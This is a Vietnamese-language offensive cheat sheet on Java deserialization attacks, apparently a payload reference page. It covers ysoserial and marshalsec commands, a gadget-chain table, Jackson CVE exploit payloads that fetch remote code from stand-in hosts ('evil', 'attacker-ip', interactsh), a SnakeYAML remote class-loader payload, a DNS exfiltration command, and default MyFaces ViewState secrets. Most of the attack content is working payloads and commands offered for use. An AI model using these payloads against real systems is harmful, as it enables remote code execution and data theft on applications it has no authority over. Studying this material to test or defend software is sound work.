# Java Deserialization

> Java serialization là quá trình chuyển đổi trạng thái của một đối tượng Java thành một luồng byte, có thể được lưu trữ hoặc truyền đi, sau đó được tái tạo (deserialized) trở lại thành đối tượng ban đầu. Serialization trong Java chủ yếu được thực hiện bằng interface `Serializable`, interface này đánh dấu một class là có thể serialization, cho phép nó được lưu vào file, gửi qua mạng hoặc truyền giữa các JVM.

## Tóm tắt

* [Phát hiện](#phát-hiện)
* [Công cụ](#công-cụ)

  * [Ysoserial](#ysoserial)
  * [Các extension Burp sử dụng ysoserial](#burp-extensions)
  * [Các công cụ thay thế](#alternative-tooling)
* [YAML Deserialization](#yaml-deserialization)
* [ViewState](#viewstate)
* [Tài liệu tham khảo](#references)

## Phát hiện

* `"AC ED 00 05"` trong Hex

  * `AC ED`: STREAM_MAGIC. Xác định đây là giao thức serialization.
  * `00 05`: STREAM_VERSION. Phiên bản serialization.
* `"rO0"` trong Base64
* `Content-Type` = "application/x-java-serialized-object"
* `"H4sIAAAAAAAAAJ"` trong gzip(base64)

## Công cụ

### Ysoserial

[frohoff/ysoserial](https://github.com/frohoff/ysoserial) : Công cụ proof-of-concept dùng để tạo payload khai thác quá trình Java object deserialization không an toàn.

```java
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

**Danh sách các payload được tích hợp trong ysoserial:**

| Payload             | Tác giả                                | Dependencies                                                                                                                                                                                         |
| ------------------- | -------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                       |
| BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5                                                                                                                                                                                            |
| C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                            |
| Click1              | @artsploit                             | click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                          |
| Clojure             | @JackOfMostTrades                      | clojure:1.8.0                                                                                                                                                                                        |
| CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                                |
| CommonsCollections1 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
| CommonsCollections2 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
| CommonsCollections3 | @frohoff                               | commons-collections:3.1                                                                                                                                                                              |
| CommonsCollections4 | @frohoff                               | commons-collections4:4.0                                                                                                                                                                             |
| CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1                                                                                                                                                                              |
| CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1                                                                                                                                                                              |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1                                                                                                                                                                              |
| FileUpload1         | @mbechler                              | commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                             |
| Groovy1             | @frohoff                               | groovy:2.3.9                                                                                                                                                                                         |
| Hibernate1          | @mbechler                              |                                                                                                                                                                                                      |
| Hibernate2          | @mbechler                              |                                                                                                                                                                                                      |
| JBossInterceptors1  | @matthias_kaiser                       | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                             |
| JRMPClient          | @mbechler                              |                                                                                                                                                                                                      |
| JRMPListener        | @mbechler                              |                                                                                                                                                                                                      |
| JSON1               | @mbechler                              | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1      | @matthias_kaiser                       | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                         |
| Jdk7u21             | @frohoff                               |                                                                                                                                                                                                      |
| Jython1             | @pwntester, @cschneider4711            | jython-standalone:2.5.2                                                                                                                                                                              |
| MozillaRhino1       | @matthias_kaiser                       | js:1.7R2                                                                                                                                                                                             |
| MozillaRhino2       | @_tint0                                | js:1.7R2                                                                                                                                                                                             |
| Myfaces1            | @mbechler                              |                                                                                                                                                                                                      |
| Myfaces2            | @mbechler                              |                                                                                                                                                                                                      |
| ROME                | @mbechler                              | rome:1.0                                                                                                                                                                                             |
| Spring1             | @frohoff                               | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                                |
| Spring2             | @mbechler                              | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                            |
| URLDNS              | @gebl                                  |                                                                                                                                                                                                      |
| Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                           |
| Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                  |

### Burp extensions

* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) - Extension Burp dùng để thực hiện các cuộc tấn công Java Deserialization
* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) - Plugin all-in-one cho Burp Suite dùng để phát hiện và khai thác các lỗ hổng Java deserialization
* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) - Tích hợp YSOSERIAL với Burp Suite
* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Xác định lỗ hổng Java Deserialization bằng Burp
* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Xác định chủ động lỗ hổng Java Deserialization bằng Burp Extender

### Các công cụ thay thế

* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Gadget RCE Deserialization thuần JRE 8
* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - Công cụ xác minh và khai thác JBoss (và các lỗ hổng Java Deserialization khác)
* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - Một fork của ứng dụng ysoserial gốc
* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Công cụ brute force Java serialization
* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - Công cụ dump các Java serialization stream dưới dạng dễ đọc hơn
* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Khai thác Deserialization để brute-force Remote Classpath
* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Code Python để Serialize và Unserialize định dạng Java binary serialization.

```java
java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
python deserek.py yss_base.bin --format python > yss_url.py
python yss_url.py yss_new.bin
java -cp JavaSerializationTestSuite DeSerial yss_new.bin
```

* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Biến dữ liệu của bạn thành code execution

```java
$ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
$ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
// -a - tạo/kiểm thử tất cả payload cho marshaller đó
// -t - chạy ở chế độ kiểm thử, unmarshalling các payload đã tạo sau khi tạo chúng.
// -v - chế độ verbose, ví dụ hiển thị cả payload được tạo trong chế độ kiểm thử.
// gadget_type - định danh của một gadget cụ thể; nếu bỏ trống sẽ hiển thị các gadget khả dụng cho marshaller cụ thể đó.
// arguments - các argument dành riêng cho gadget
```

Các payload generator cho những marshaller sau được tích hợp:

| Marshaller        | Gadget Impact                                                                         |
| ----------------- | ------------------------------------------------------------------------------------- |
| BlazeDSAMF(0|3|X) | Chỉ JDK escalation sang Java serialization và RCE thông qua nhiều thư viện bên thứ ba |
| Hessian|Burlap    | Nhiều RCE thông qua thư viện bên thứ ba                                               |
| Castor            | RCE thông qua thư viện dependency                                                     |
| Jackson           | **Có khả năng RCE chỉ với JDK**, RCE thông qua nhiều thư viện bên thứ ba              |
| Java              | Một dạng RCE khác thông qua thư viện bên thứ ba                                       |
| JsonIO            | **RCE chỉ với JDK**                                                                   |
| JYAML             | **RCE chỉ với JDK**                                                                   |
| Kryo              | RCE thông qua thư viện bên thứ ba                                                     |
| KryoAltStrategy   | **RCE chỉ với JDK**                                                                   |
| Red5AMF(0|3)      | **RCE chỉ với JDK**                                                                   |
| SnakeYAML         | **RCE chỉ với JDK**                                                                   |
| XStream           | **RCE chỉ với JDK**                                                                   |
| YAMLBeans         | RCE thông qua thư viện bên thứ ba                                                     |

## JSON Deserialization

Có nhiều thư viện có thể được sử dụng để xử lý JSON trong Java.

* [json-io](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#json-io-json)
* [Jackson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)
* [Fastjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#fastjson-json)
* [Genson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)
* [Flexjson](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#flexjson-json)
* [Jodd](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jodd-json)

**Jackson**:

Jackson là một thư viện Java phổ biến được sử dụng để làm việc với dữ liệu JSON (JavaScript Object Notation).

Jackson-databind hỗ trợ Polymorphic Type Handling (PTH), trước đây được gọi là "Polymorphic Deserialization", và tính năng này bị vô hiệu hóa theo mặc định.

Để xác định backend có đang sử dụng Jackson hay không, kỹ thuật phổ biến nhất là gửi một JSON không hợp lệ và kiểm tra thông báo lỗi. Hãy tìm các tham chiếu đến một trong hai thành phần sau:

```java
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

* com.fasterxml.jackson.databind
* org.codehaus.jackson.map

**Khai thác**:

* **CVE-2017-7525**

  ```json
  {
    "param": [
      "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
      {
        "transletBytecodes": [
          "yv66v[JAVA_CLASS_B64_ENCODED]AIAEw=="
        ],
        "transletName": "a.b",
        "outputProperties": {}
      }
    ]
  }
  ```

* **CVE-2017-17485**

  ```json
  {
    "param": [
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "http://evil/spel.xml"
    ]
  }
  ```

* **CVE-2019-12384**

  ```json
  [
    "ch.qos.logback.core.db.DriverManagerConnectionSource", 
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"
    }
  ]
  ```

* **CVE-2020-36180**

  ```json
  [
    "org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS",
    {
      "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://evil:3333/exec.sql'"
    }
  ]
  ```

* **CVE-2020-9548**

  ```json
  [
    "br.com.anteros.dbcp.AnterosDBCPConfig",
    {
      "healthCheckRegistry": "ldap://{{interactsh-url}}"
    }
  ]
  ```

## YAML Deserialization

* [SnakeYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#snakeyaml-yaml)
* [jYAML](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jyaml-yaml)
* [YamlBeans](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#yamlbeans-yaml)

**SnakeYAML**:

SnakeYAML là một thư viện Java phổ biến được sử dụng để phân tích cú pháp và tạo YAML (YAML Ain't Markup Language). Thư viện cung cấp API dễ sử dụng để làm việc với YAML, một tiêu chuẩn serialization dữ liệu dạng text dễ đọc, thường được sử dụng cho các file cấu hình và trao đổi dữ liệu.

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## ViewState

Trong Java, ViewState đề cập đến cơ chế được các framework như JavaServer Faces (JSF) sử dụng để duy trì trạng thái của các thành phần UI giữa các HTTP request trong ứng dụng web. Có 2 implementation chính:

* Oracle Mojarra (implementation tham chiếu của JSF)
* Apache MyFaces

**Công cụ**:

* [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Công cụ xác minh và khai thác Jboss (và các lỗ hổng Java Deserialization)
* [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace là phần mềm dùng để patch các JSF ViewState không được mã hóa và không được ký.

### Encoding

| Encoding      | Starts with |
| ------------- | ----------- |
| base64        | `rO0`       |
| base64 + gzip | `H4sIAAA`   |

### Storage

`javax.faces.STATE_SAVING_METHOD` là một tham số cấu hình trong JavaServer Faces (JSF). Nó xác định cách JSF lưu trạng thái của một component tree (cấu trúc và dữ liệu của các component trên một trang) giữa các HTTP request.

Phương thức lưu trữ cũng có thể được suy ra từ biểu diễn của viewstate trong HTML body.

* **Server side** storage: `value="-XXX:-XXXX"`
* **Client side** storage: `base64 + gzip + Java Object`

### Encryption

Theo mặc định, MyFaces sử dụng DES làm thuật toán mã hóa và HMAC-SHA1 để xác thực ViewState. Có thể và được khuyến nghị cấu hình các thuật toán mới hơn như AES và HMAC-SHA256.

| Encryption Algorithm | HMAC      |
| -------------------- | --------- |
| DES ECB (default)    | HMAC-SHA1 |

Các phương thức mã hóa được hỗ trợ gồm BlowFish, 3DES và AES, được định nghĩa thông qua một context parameter.

Giá trị của các parameter này và các secret của chúng có thể được tìm thấy trong các XML clause sau.

```xml
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

Các secret phổ biến từ [documentation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application).

| Name                 | Value                              |
| -------------------- | ---------------------------------- |
| AES CBC/PKCS5Padding | `NzY1NDMyMTA3NjU0MzIxMA==`         |
| DES                  | `NzY1NDMyMTA=<`                    |
| DESede               | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| Blowfish             | `NzY1NDMyMTA3NjU0MzIxMA`           |
| AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |

* **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
* **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data

## References

* [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://web.archive.org/web/20230927142712/https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
* [Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill - October 4, 2017](https://web.archive.org/web/20260303123815/https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
* [Hack The Box - Arkham - 0xRick - August 10, 2019](https://web.archive.org/web/20251125134359/https://0xrick.github.io/hack-the-box/arkham/)
* [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://web.archive.org/web/20250918030712/https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
* [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
* [Jackson gadgets - Anatomy of a vulnerability - Andrea Brancaleoni - July 22, 2019](https://web.archive.org/web/20190724143322/https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
* [Jackson Polymorphic Deserialization - FasterXML - July 23, 2020](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
* [Java Deserialization Cheat Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
* [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://web.archive.org/web/20250909154616/https://www.exploit-db.com/docs/48126)
* [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://web.archive.org/web/20160315020109/http://synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://web.archive.org/web/20181217131654/https://alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://web.archive.org/web/20201207032909/https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e806)
* [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://web.archive.org/web/20260210022416/https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
* [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://web.archive.org/web/20250604040229/https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://web.archive.org/web/20250604034046/https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
* [Friday the 13th JSON Attacks - Alvaro Muñoz & Oleksandr Mirosh - July 28, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-the-13th-JSON-Attacks-wp.pdf)
